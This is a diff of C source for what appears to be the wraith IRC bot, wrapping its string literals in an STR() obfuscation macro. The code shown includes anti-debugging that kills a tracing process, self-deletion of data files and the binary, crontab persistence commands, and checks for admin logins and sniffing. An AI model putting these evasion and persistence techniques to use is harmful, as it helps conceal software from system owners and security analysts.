@@ -97,7 +97,7 @@ void clear_tmp()
     if (strncmp(dir_ent->d_name, ".pid.", 4) && 
         strncmp(dir_ent->d_name, ".u", 2) && 
         strcmp(dir_ent->d_name, ".bin.old") && 
-        strncmp(dir_ent->d_name, ".socks-", 7) &&
+        strncmp(dir_ent->d_name, STR(".socks-"), 7) &&
         strcmp(dir_ent->d_name, ".") && 
         strcmp(dir_ent->d_name, ".un") && 
         strcmp(dir_ent->d_name, "..")) {
@@ -185,7 +185,7 @@ void check_last() {
   if (conf.username) {
     char *out = NULL, buf[50] = "";
 
-    simple_sprintf(buf, "last -10 %s", conf.username);
+    simple_sprintf(buf, STR("last -10 %s"), conf.username);
     if (shell_exec(buf, NULL, &out, NULL)) {
       if (out) {
         char *p = NULL;
@@ -200,7 +200,7 @@ void check_last() {
 
               work = (char *) my_calloc(1, strlen(out) + 7 + 2 + 1);
 
-              simple_sprintf(work, "Login: %s", out);
+              simple_sprintf(work, STR("Login: %s"), out);
               detected(DETECT_LOGIN, work);
               free(work);
             }
@@ -348,7 +348,7 @@ void check_promisc()
       if (ifreq.ifr_flags & IFF_PROMISC) {
         char which[101] = "";
 
-        simple_sprintf(which, "Detected promiscuous mode on interface: %s", ifr->ifr_name);
+        simple_sprintf(which, STR("Detected promiscuous mode on interface: %s"), ifr->ifr_name);
         ioctl(sock, SIOCSIFFLAGS, &ifreq);	/* set flags */
         detected(DETECT_PROMISC, which);
 	break;
@@ -402,7 +402,7 @@ void check_trace(int start)
       kill(parent, SIGKILL);
       exit(1);
     } else
-      detected(DETECT_TRACE, "I'm being traced!");
+      detected(DETECT_TRACE, STR("I'm being traced!"));
   } else {
     if (!start)
       return;
@@ -422,7 +422,7 @@ void check_trace(int start)
             kill(parent, SIGKILL);
             exit(1);
           } else
-            detected(DETECT_TRACE, "I'm being traced!");
+            detected(DETECT_TRACE, STR("I'm being traced!"));
         } else {
           waitpid(parent, NULL, 0);
           ptrace(PT_DETACH, parent, (char *) 1, 0);
@@ -568,23 +568,23 @@ void suicide(const char *msg)
 {
   char tmp[512] = "";
 
-  putlog(LOG_WARN, "*", "Comitting suicide: %s", msg);
-  simple_sprintf(tmp, "Suicide: %s", msg);
+  putlog(LOG_WARN, "*", STR("Comitting suicide: %s"), msg);
+  simple_sprintf(tmp, STR("Suicide: %s"), msg);
   set_user(&USERENTRY_COMMENT, conf.bot->u, tmp);
   if (!conf.bot->hub) {
-    nuke_server("kill the infidels!");
+    nuke_server(STR("kill the infidels!"));
     sleep(1);
   } else {
     unlink(userfile);
-    simple_snprintf(tmp, sizeof(tmp), "%s~new", userfile);
+    simple_snprintf(tmp, sizeof(tmp), STR("%s~new"), userfile);
     unlink(tmp);
-    simple_snprintf(tmp, sizeof(tmp), "%s~", userfile);
+    simple_snprintf(tmp, sizeof(tmp), STR("%s~"), userfile);
     unlink(tmp);
-    simple_snprintf(tmp, sizeof(tmp), "%s/%s~", conf.datadir, userfile);
+    simple_snprintf(tmp, sizeof(tmp), STR("%s/%s~"), conf.datadir, userfile);
     unlink(tmp);
-    simple_snprintf(tmp, sizeof(tmp), "%s/.u.0", conf.datadir);
+    simple_snprintf(tmp, sizeof(tmp), STR("%s/.u.0"), conf.datadir);
     unlink(tmp);
-    simple_snprintf(tmp, sizeof(tmp), "%s/.u.1", conf.datadir);
+    simple_snprintf(tmp, sizeof(tmp), STR("%s/.u.1"), conf.datadir);
     unlink(tmp);
   }
   unlink(binname);
@@ -630,7 +630,7 @@ void detected(int code, char *msg)
     break;
   case DET_REJECT:
     do_fork();
-    putlog(LOG_WARN, "*", "Setting myself +d: %s", msg);
+    putlog(LOG_WARN, "*", STR("Setting myself +d: %s"), msg);
     simple_sprintf(tmp, "+d: %s", msg);
     set_user(&USERENTRY_COMMENT, conf.bot->u, tmp);
     fr.global = USER_DEOP;
@@ -639,11 +639,11 @@ void detected(int code, char *msg)
     sleep(1);
     break;
   case DET_DIE:
-    putlog(LOG_WARN, "*", "Dying: %s", msg);
-    simple_sprintf(tmp, "Dying: %s", msg);
+    putlog(LOG_WARN, "*", STR("Dying: %s"), msg);
+    simple_sprintf(tmp, STR("Dying: %s"), msg);
     set_user(&USERENTRY_COMMENT, conf.bot->u, tmp);
     if (!conf.bot->hub)
-      nuke_server("BBL");
+      nuke_server(STR("BBL"));
     sleep(1);
     killbots++;
     do_fatal++;
@@ -664,13 +664,13 @@ char *werr_tostr(int errnum)
 {
   switch (errnum) {
   case ERR_BINSTAT:
-    return "Cannot access binary";
+    return STR("Cannot access binary");
   case ERR_BADPASS:
-    return "Incorrect password";
+    return STR("Incorrect password");
   case ERR_PASSWD:
-    return "Cannot access the global passwd file";
+    return STR("Cannot access the global passwd file");
   case ERR_WRONGBINDIR:
-    return "Wrong directory/binary name";
+    return STR("Wrong directory/binary name");
   case ERR_DATADIR: 
     return STR("Cannot access datadir.");
   case ERR_TMPSTAT:
@@ -682,7 +682,7 @@ char *werr_tostr(int errnum)
   case ERR_WRONGUNAME:
     return STR("Uname in binary does not match uname()");
   case ERR_BADCONF:
-    return "Config file is incomplete";
+    return STR("Config file is incomplete");
   case ERR_BADBOT:
     return STR("No such botnick");
   case ERR_BOTDISABLED:
@@ -698,7 +698,7 @@ char *werr_tostr(int errnum)
   case ERR_NOTINIT:
     return STR("Binary data is not initialized; try ./binary -C");
   default:
-    return "Unforseen error";
+    return STR("Unforseen error");
   }
 
 }
@@ -721,8 +721,8 @@ void werr(int errnum)
   }
   */
   /*  printf("\n[%lu]+  Stopped                 %s\r\n", job, basename(binname)); */
-  sdprintf("Error %d: %s", errnum, werr_tostr(errnum));
-  printf("*** Error code %d\n\n", errnum);
+  sdprintf(STR("Error %d: %s"), errnum, werr_tostr(errnum));
+  printf(STR("*** Error code %d\n\n"), errnum);
   printf(STR("Segmentation fault\n"));
   fatal("", 0);
   exit(0);				//gcc is stupid :)
@@ -736,12 +736,12 @@ int email(char *subject, char *msg, int who)
   FILE *f = NULL;
 
   uname(&un);
-  if (is_file("/usr/sbin/sendmail"))
+  if (is_file(STR("/usr/sbin/sendmail")))
     sendmail++;
-  else if (is_file("/usr/bin/mail"))
+  else if (is_file(STR("/usr/bin/mail")))
     mail++;
   else {
-    putlog(LOG_WARN, "*", "I Have no usable mail client.");
+    putlog(LOG_WARN, "*", STR("I Have no usable mail client."));
     return 1;
   }
 
@@ -750,22 +750,22 @@ int email(char *subject, char *msg, int who)
   }
   if (who & EMAIL_TEAM) {
     if (addrs[0])
-      simple_sprintf(addrs, "%s wraith@shatow.net", addrs);
+      simple_sprintf(addrs, STR("%s wraith@shatow.net"), addrs);
     else
-      simple_sprintf(addrs, "wraith@shatow.net");
+      simple_sprintf(addrs, STR("wraith@shatow.net"));
   }
 
   if (sendmail)
-    simple_sprintf(run, "/usr/sbin/sendmail -t");
+    simple_sprintf(run, STR("/usr/sbin/sendmail -t"));
   else if (mail)
-    simple_sprintf(run, "/usr/bin/mail %s -a \"From: %s@%s\" -s \"%s\" -a \"Content-Type: text/plain\"", addrs, conf.bot->nick ? conf.bot->nick : "none", un.nodename, subject);
+    simple_sprintf(run, STR("/usr/bin/mail %s -a \"From: %s@%s\" -s \"%s\" -a \"Content-Type: text/plain\""), addrs, conf.bot->nick ? conf.bot->nick : "none", un.nodename, subject);
 
   if ((f = popen(run, "w"))) {
     if (sendmail) {
-      fprintf(f, "To: %s\n", addrs);
-      fprintf(f, "From: %s@%s\n", origbotname[0] ? origbotname : (conf.username ? conf.username : "WRAITH"), un.nodename);
-      fprintf(f, "Subject: %s\n", subject);
-      fprintf(f, "Content-Type: text/plain\n");
+      fprintf(f, STR("To: %s\n"), addrs);
+      fprintf(f, STR("From: %s@%s\n"), origbotname[0] ? origbotname : (conf.username ? conf.username : "WRAITH"), un.nodename);
+      fprintf(f, STR("Subject: %s\n"), subject);
+      fprintf(f, STR("Content-Type: text/plain\n"));
     }
     fprintf(f, "%s\n", msg);
     if (fflush(f))
@@ -783,8 +783,7 @@ void baduname(char *confhas, char *myuname) {
 
   tmpFile = (char *) my_calloc(1, strlen(tempdir) + 3 + 1);
 
-  simple_sprintf(tmpFile, "%s/.un", conf.datadir);
-  sdprintf("CHECKING %s", tmpFile);
+  simple_sprintf(tmpFile, STR("%s/.un"), conf.datadir);
   if (is_file(tmpFile)) {
     struct stat ss;
     time_t diff;
@@ -815,7 +814,7 @@ void baduname(char *confhas, char *myuname) {
     char msg[1024] = "", subject[31] = "";
 
     uname(&un);
-    simple_snprintf(subject, sizeof subject, "CONF/UNAME() mismatch notice");
+    simple_snprintf(subject, sizeof subject, STR("CONF/UNAME() mismatch notice"));
     simple_snprintf(msg, sizeof msg, STR("This is an auto email from a wraith bot which has you in it's OWNER_EMAIL list..\n \nThe uname() output on this box has changed, probably due to a kernel upgrade...\nMy login is: %s\nMy binary is: %s\nLocalhub: %s\nConf   : %s\nUname(): %s\n \nThis email will only be sent once a day while this error is present.\nYou need to login to my shell (%s) and fix my local config.\n"), 
                                   conf.username ? conf.username : "unknown", 
                                   binname,
@@ -841,17 +840,17 @@ char *homedir(bool useconf)
 #else /* !CYGWIN_HACKS */
       struct passwd *pw = NULL;
  
-      ContextNote("getpwuid()");
+      ContextNote(STR("getpwuid()"));
       pw = getpwuid(myuid);
       if (pw)
         simple_snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
-      ContextNote("getpwuid(): Success");
+      ContextNote(STR("getpwuid(): Success"));
 #endif /* CYGWIN_HACKS */
     }
-    ContextNote("realpath()");
+    ContextNote(STR("realpath()"));
     if (tmp[0])
       realpath(tmp, homedir_buf); /* this will convert lame home dirs of /home/blah->/usr/home/blah */
-    ContextNote("realpath(): Success");
+    ContextNote(STR("realpath(): Success"));
   }
   return homedir_buf[0] ? homedir_buf : NULL;
 }
@@ -866,9 +865,9 @@ char *my_username()
 #else /* !CYGWIN_HACKS */
     struct passwd *pw = NULL;
 
-    ContextNote("getpwuid()");
+    ContextNote(STR("getpwuid()"));
     pw = getpwuid(myuid);
-    ContextNote("getpwuid(): Success");
+    ContextNote(STR("getpwuid(): Success"));
     if (pw)
       simple_snprintf(username, sizeof username, "%s", pw->pw_name);
 #endif /* CYGWIN_HACKS */
@@ -962,17 +961,17 @@ char *move_bin(const char *ipath, const char *file, bool run)
 
   simple_snprintf(newbin, sizeof newbin, "%s%s%s", path, path[strlen(path) - 1] == '/' ? "" : "/", file);
 
-  ContextNote("realpath()");
+  ContextNote(STR("realpath()"));
   realpath(binname, real);            /* get the realpath of binname */
-  ContextNote("realpath(): Success");
+  ContextNote(STR("realpath(): Success"));
   /* running from wrong dir, or wrong bin name.. lets try to fix that :) */
-  sdprintf("binname: %s", binname);
-  sdprintf("newbin: %s", newbin);
-  sdprintf("real: %s", real);
+  sdprintf(STR("binname: %s"), binname);
+  sdprintf(STR("newbin: %s"), newbin);
+  sdprintf(STR("real: %s"), real);
   if (strcmp(binname, newbin) && strcmp(newbin, real)) {              /* if wrong path and new path != current */
     bool ok = 1;
 
-    sdprintf("wrong dir, is: %s :: %s", binname, newbin);
+    sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
 
     unlink(newbin);
     if (copyfile(binname, newbin))
@@ -989,19 +988,19 @@ char *move_bin(const char *ipath, const char *file, bool run)
     }
 
     if (ok) {
-      sdprintf("Binary successfully moved to: %s", newbin);
+      sdprintf(STR("Binary successfully moved to: %s"), newbin);
       unlink(binname);
       if (run) {
         simple_snprintf(newbin, sizeof newbin, "%s%s%s", 
                         path, path[strlen(path) - 1] == '/' ? "" : "/", shell_escape(file));
         system(newbin);
-        sdprintf("exiting to let new binary run...");
+        sdprintf(STR("exiting to let new binary run..."));
         exit(0);
       }
     } else {
       if (run)
         werr(ERR_WRONGBINDIR);
-      sdprintf("Binary move failed to: %s", newbin);
+      sdprintf(STR("Binary move failed to: %s"), newbin);
       return binname;
     }
   }
@@ -1013,11 +1012,11 @@ void check_crontab()
   int i = 0;
 
   if (!conf.bot->hub && !conf.bot->localhub)
-    fatal("something is wrong.", 0);
+    fatal(STR("something is wrong."), 0);
   if (!(i = crontab_exists())) {
     crontab_create(5);
     if (!(i = crontab_exists()))
-      printf("* Error writing crontab entry.\n");
+      printf(STR("* Error writing crontab entry.\n"));
   }
 }
 
@@ -1030,10 +1029,10 @@ void crontab_del() {
   if (!(p = strrchr(tmpFile, '/')))
     return;
   p++;
-  strcpy(p, ".ctb");
-  simple_sprintf(buf, "crontab -l | grep -v '%s' | grep -v \"^#\" | grep -v \"^\\$\" > %s", binname, tmpFile);
+  strcpy(p, STR(".ctb"));
+  simple_sprintf(buf, STR("crontab -l | grep -v '%s' | grep -v \"^#\" | grep -v \"^\\$\" > %s"), binname, tmpFile);
   if (shell_exec(buf, NULL, NULL, NULL)) {
-    simple_sprintf(buf, "crontab %s", tmpFile);
+    simple_sprintf(buf, STR("crontab %s"), tmpFile);
     shell_exec(buf, NULL, NULL, NULL);
   }
   unlink(tmpFile);
@@ -1042,7 +1041,7 @@ void crontab_del() {
 int crontab_exists() {
   char buf[2048] = "", *out = NULL;
 
-  simple_snprintf(buf, sizeof buf, "crontab -l | grep '%s' | grep -v \"^#\"", binname);
+  simple_snprintf(buf, sizeof buf, STR("crontab -l | grep '%s' | grep -v \"^#\""), binname);
   if (shell_exec(buf, NULL, &out, NULL)) {
     if (out && strstr(out, binname)) {
       free(out);
@@ -1061,7 +1060,7 @@ void crontab_create(int interval) {
   FILE *f = NULL;
   int fd;
 
-  simple_snprintf(tmpFile, sizeof tmpFile, "%s.crontab-XXXXXX", tempdir);
+  simple_snprintf(tmpFile, sizeof tmpFile, STR("%s.crontab-XXXXXX"), tempdir);
   if ((fd = mkstemp(tmpFile)) == -1) {
     unlink(tmpFile);
     return;
@@ -1069,7 +1068,7 @@ void crontab_create(int interval) {
 
   char buf[256] = "";
 
-  simple_snprintf(buf, sizeof buf, "crontab -l | grep -v \"%s\" | grep -v \"^#\" | grep -v \"^\\$\"> %s", 
+  simple_snprintf(buf, sizeof buf, STR("crontab -l | grep -v \"%s\" | grep -v \"^#\" | grep -v \"^\\$\"> %s"), 
                   binname, tmpFile);
   if (shell_exec(buf, NULL, NULL, NULL) && (f = fdopen(fd, "a")) != NULL) {
     buf[0] = 0;
@@ -1087,11 +1086,11 @@ void crontab_create(int interval) {
         i += interval;
       }
     }
-    simple_snprintf(buf + strlen(buf), sizeof buf, " * * * * %s > /dev/null 2>&1", binname);
+    simple_snprintf(buf + strlen(buf), sizeof buf, STR(" * * * * %s > /dev/null 2>&1"), binname);
     fseek(f, 0, SEEK_END);
     fprintf(f, "\n%s\n", buf);
     fclose(f);
-    simple_sprintf(buf, "crontab %s", tmpFile);
+    simple_sprintf(buf, STR("crontab %s"), tmpFile);
     shell_exec(buf, NULL, NULL, NULL);
   }
   close(fd);
@@ -1138,15 +1137,15 @@ void crazy_trace()
 int det_translate(const char *word)
 {
   if (word && word[0]) {
-    if (!egg_strcasecmp(word, "ignore"))
+    if (!egg_strcasecmp(word, STR("ignore")))
       return DET_IGNORE;
-    else if (!egg_strcasecmp(word, "warn"))
+    else if (!egg_strcasecmp(word, STR("warn")))
       return DET_WARN;
-    else if (!egg_strcasecmp(word, "reject"))
+    else if (!egg_strcasecmp(word, STR("reject")))
       return DET_REJECT;
-    else if (!egg_strcasecmp(word, "die"))
+    else if (!egg_strcasecmp(word, STR("die")))
       return DET_DIE;
-    else if (!egg_strcasecmp(word, "suicide"))
+    else if (!egg_strcasecmp(word, STR("suicide")))
       return DET_SUICIDE;
   }
   return DET_IGNORE;
@@ -1155,14 +1154,14 @@ int det_translate(const char *word)
 const char *det_translate_num(int num)
 {
   switch (num) {
-    case DET_IGNORE: return "ignore";
-    case DET_WARN:   return "warn";
-    case DET_REJECT: return "reject";
-    case DET_DIE:    return "die";
-    case DET_SUICIDE:return "suicide";
-    default:         return "ignore";
+    case DET_IGNORE: return STR("ignore");
+    case DET_WARN:   return STR("warn");
+    case DET_REJECT: return STR("reject");
+    case DET_DIE:    return STR("die");
+    case DET_SUICIDE:return STR("suicide");
+    default:         return STR("ignore");
   }
-  return "ignore";
+  return STR("ignore");
 }
 
 char *shell_escape(const char *path)
